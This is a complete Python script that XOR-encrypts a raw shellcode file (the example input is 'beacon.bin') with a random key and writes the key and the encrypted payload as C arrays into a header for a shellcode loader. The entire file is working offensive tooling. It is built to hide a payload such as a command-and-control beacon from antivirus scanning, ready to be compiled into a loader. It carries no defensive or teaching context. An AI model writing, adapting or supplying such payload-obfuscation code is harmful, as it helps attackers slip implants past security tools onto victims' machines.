#!/usr/bin/env python3
"""XOR-encrypt shellcode and output a C header for the loader."""

import argparse
import os
import sys


def main():
    parser = argparse.ArgumentParser(
        description="XOR-encrypt shellcode to C header"
    )
    parser.add_argument(
        "input", help="Raw shellcode file (e.g. beacon.bin)"
    )
    parser.add_argument(
        "-o", "--output", default="shellcode.h",
        help="Output header file"
    )
    parser.add_argument(
        "-k", "--key-length", type=int, default=16,
        help="XOR key length in bytes"
    )
    args = parser.parse_args()

    if not os.path.isfile(args.input):
        print(f"Error: {args.input} not found", file=sys.stderr)
        sys.exit(1)

    with open(args.input, "rb") as f:
        shellcode = f.read()

    key = os.urandom(args.key_length)
    encrypted = bytes(
        shellcode[i] ^ key[i % len(key)]
        for i in range(len(shellcode))
    )

    with open(args.output, "w") as f:
        f.write(
            f"// XOR-encrypted shellcode — {len(shellcode)} bytes\n"
        )
        f.write(f"// Key length: {len(key)} bytes\n\n")

        f.write(f"unsigned char key[{len(key)}] = {{\n    ")
        for i, b in enumerate(key):
            f.write(f"0x{b:02x}")
            if i < len(key) - 1:
                f.write(", ")
            if (i + 1) % 12 == 0 and i < len(key) - 1:
                f.write("\n    ")
        f.write("\n};\n\n")

        f.write(f"unsigned int key_len = {len(key)};\n\n")

        f.write(
            f"unsigned char payload[{len(encrypted)}] = {{\n    "
        )
        for i, b in enumerate(encrypted):
            f.write(f"0x{b:02x}")
            if i < len(encrypted) - 1:
                f.write(", ")
            if (i + 1) % 12 == 0 and i < len(encrypted) - 1:
                f.write("\n    ")
        f.write("\n};\n\n")

        f.write(f"unsigned int payload_len = {len(encrypted)};\n")

    print(f"[+] Shellcode: {len(shellcode)} bytes")
    print(f"[+] Key:       {len(key)} bytes")
    print(f"[+] Output:    {args.output}")


if __name__ == "__main__":
    main()
